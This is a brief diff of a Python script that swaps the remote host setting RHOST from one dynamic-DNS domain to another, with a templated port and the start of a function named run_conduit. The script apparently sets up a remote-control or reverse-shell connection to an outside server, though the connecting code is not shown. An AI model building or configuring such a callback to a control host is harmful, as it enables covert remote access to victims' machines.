@@ -10,7 +10,7 @@ import subprocess
 from threading import Thread
 
 # --- DYNAMIC CONFIG ---
-RHOST = "control.ddnasking.com"
+RHOST = "pong-control.ddns.net"
 RPORT = ##RPORT##
 
 def run_conduit():
